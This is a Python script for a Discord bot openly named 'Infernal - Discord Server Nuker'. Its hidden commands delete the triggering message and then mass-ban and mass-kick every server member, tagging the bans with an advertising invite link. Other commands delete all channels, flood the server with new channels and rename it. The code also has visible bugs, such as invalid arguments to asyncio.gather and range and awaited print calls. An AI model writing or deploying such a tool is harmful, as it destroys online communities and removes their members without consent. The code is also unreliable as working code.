import discord
import asyncio
import threading
import concurrent.futures
import fade
import os
import time 
import colorama
import ctypes
from colorama import Fore, Back, Style
from discord.ext import commands
from discord import Forbidden, HTTPException

intents = discord.Intents.default()
intents.members = True 
intents.message_content = True  

colorama.init(autoreset=True)

ctypes.windll.kernel32.SetConsoleTitleW('Infernal - Discord Server Nuker')

bot = commands.Bot(command_prefix='!', intents=intents)
text_art = """    
                                      
   ██▓ ███▄    █   █████▒▓█████  ██▀███   ███▄    █  ▄▄▄       ██▓    
  ▓██▒ ██ ▀█   █ ▓██   ▒ ▓█   ▀ ▓██ ▒ ██▒ ██ ▀█   █ ▒████▄    ▓██▒            !banall !kickall
  ▒██▒▓██  ▀█ ██▒▒████ ░ ▒███   ▓██ ░▄█ ▒▓██  ▀█ ██▒▒██  ▀█▄  ▒██░      !removechannels !servername
  ░██░▓██▒  ▐▌██▒░▓█▒  ░ ▒▓█  ▄ ▒██▀▀█▄  ▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██░            !createchannels
  ░██░▒██░   ▓██░░▒█░    ░▒████▒░██▓ ▒██▒▒██░   ▓██░ ▓█   ▓██▒░██████▒
  ░▓  ░ ▒░   ▒ ▒  ▒ ░    ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒░▓  ░   ifs?
   ▒ ░░ ░░   ░ ▒░ ░       ░ ░  ░  ░▒ ░ ▒░░ ░░   ░ ▒░  ▒   ▒▒ ░░ ░ ▒  ░   
   ▒ ░   ░   ░ ░  ░ ░       ░     ░░   ░    ░   ░ ░    
    ░   ▒     ░ ░   
   ░           ░            ░  ░   ░              ░       ░  ░    ░  ░
                                                                    
                                                       
"""                                 
artlol = fade.blackwhite(text_art)

current_time = ""

def update_time():
    global current_time
    while True:
        t = time.localtime()
        current_time = time.strftime("%H:%M:%S", t)
        time.sleep(1)

time_thread = threading.Thread(target=update_time)
time_thread.daemon = True
time_thread.start()


time.sleep(1)

print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Initializing Bot..")           

@bot.event
async def on_ready():
    print(f'[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] {bot.user} has connected to Discord!')
    os.system('cls')
    print(artlol)
    
intensity = input(f' Speed 1/10 (5 is reccomended , over might {Fore.RED}suspend{Fore.RESET} your token) > ')
channelintensity = intensity
banintensity = float(intensity) * 0.25



@bot.command(name='banall', hidden=True)
async def ban_all(ctx):
    await ctx.message.delete()
    ctypes.windll.kernel32.SetConsoleTitleW('Infernal - Banning') 
    tasks = []
    for member in ctx.guild.members:
        task = asyncio.create_task(ban_member(ctx, member, reason='Infernal https://discord.gg/2sZcY3tyns', delete_message_days=0))
        tasks.append(task)
    await asyncio.gather(*tasks, limit=banintensity, return_exceptions=True) #banintensity is a place holder for how many concurrent tasks will be running

async def ban_member(ctx, member, reason, delete_message_days, retries=3):
    for attempt in range(retries):
        try:
            await ctx.guild.ban(member, reason=reason, delete_message_days=delete_message_days)
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.GREEN}+{Fore.RESET}] Banned {member.id} ({member.name}#{member.discriminator})")
            return
        except discord.Forbidden:
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Skipping {member.id} ({member.name}#{member.discriminator}) (no permission to ban)")
            return
        except discord.HTTPException as e:
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Error banning {member.id} ({member.name}#{member.discriminator}) (attempt {attempt+1}/{retries})")
            await asyncio.sleep(1)
    print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}]  [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Skipping {member.id} ({member.name}#{member.discriminator}) (all retries failed)")

@bot.command(name='kickall', hidden=True)
async def kick_all(ctx):
    await ctx.message.delete() 
    ctypes.windll.kernel32.SetConsoleTitleW('Infernal - Kicking')
    tasks = []
    for member in ctx.guild.members:
        task = asyncio.create_task(kick_member(ctx, member, reason='Infernal https://discord.gg/2sZcY3tyns'))
        tasks.append(task)
    await asyncio.gather(*tasks, limit=10, return_exceptions=True)
    ctypes.windll.kernel32.SetConsoleTitleW('Infernal - Discord Server Nuker')

async def kick_member(ctx, member, reason, retries=3):
    for attempt in range(retries):
        try:
            await member.kick(reason=reason)
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.GREEN}+{Fore.RESET}] Kicked {member.id} ({member.name}#{member.discriminator})")
            return
        except discord.Forbidden:
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Skipping {member.id} ({member.name}#{member.discriminator}) (no permission to kick)")
            return
        except discord.HTTPException as e:
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Error kicking {member.id} ({member.name}#{member.discriminator}) (attempt {attempt+1}/{retries})")
            await asyncio.sleep(1)
    print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}]  [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Skipping {member.id} ({member.name}#{member.discriminator}) (all retries failed)")

@bot.command(name='removechannels')
async def delete_channels(ctx):
    tasks = []
    fail_count = 0

    async def delete_channel(channel):
        nonlocal fail_count
        try:
            await channel.delete()
            print(f"[{Fore.RED}-{Fore.RESET}] Deleted channel: {channel.name}")
        except Forbidden:
            fail_count += 1
            print(f"[{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Forbidden to delete channel")
        except HTTPException as e:
            fail_count += 1
            print(f"[{Fore.LIGHTBLACK_EX}~{Fore.RESET}] An error occurred: {e}")

    channels = ctx.guild.channels[:]
    for i in range(0, len(channels), channelintensity):
        tasks = [asyncio.create_task(delete_channel(channel)) for channel in channels[i:i+channelintensity]]
        await asyncio.gather(*tasks)
        if fail_count > 10:
            print(f"[{Fore.LIGHTBLACK_EX}~{Fore.RESET}]Failed to delete channels more than 10 times. Stopping.")
            return

    print(f"[{Fore.GREEN}+{Fore.RESET}] All channels have been deleted")

@bot.command(name='createchannels')
async def create_channels(ctx):
    channel_name = input(f' Channel Name > ')
    channel_count = 0

    async def create_channel(channel_name, channel_count):
        await ctx.guild.create_text_channel(channel_name + str(channel_count))
        channel_count += 1
        print(f"[{Fore.GREEN}+{Fore.RESET}] Channel has been made")

    tasks = []
    for i in range(channelintensity):  #channelintensity is a place holder for how many concurrent tasks will be running
        task = create_channel(channel_name, channel_count)
        tasks.append(task)
        channel_count += 1

    try:
        await asyncio.gather(*tasks)
        await ctx.send(f"[{Fore.GREEN}+{Fore.RESET}] Channels created successfully!")
    except discord.Forbidden:
        await print(f"[{Fore.LIGHTBLACK_EX}~{Fore.RESET}] You don't have admin")
    except discord.HTTPException as e:
        if e.status == 403:
            print(f"[{Fore.LIGHTBLACK_EX}~{Fore.RESET}] I've hit the channel limit!")
        else:
            await print(f"[{Fore.LIGHTBLACK_EX}~{Fore.RESET}] An error occurred: ")


@bot.command(name='servername', hidden=True)
async def change_server_name(ctx):
    await ctx.message.delete()  
    server = ctx.guild
    new_name = input(' Server Name > ')
    try:
        await server.edit(name=new_name)
        print(f'[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.GREEN}+{Fore.RESET}] Server name changed to {new_name}')
    except discord.Forbidden:
        print(f'[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.RED}-{Fore.RESET}] Failed to change server name (no permission)')

#Add your token into here
bot.run('TOKEN_HERE', log_handler=None)
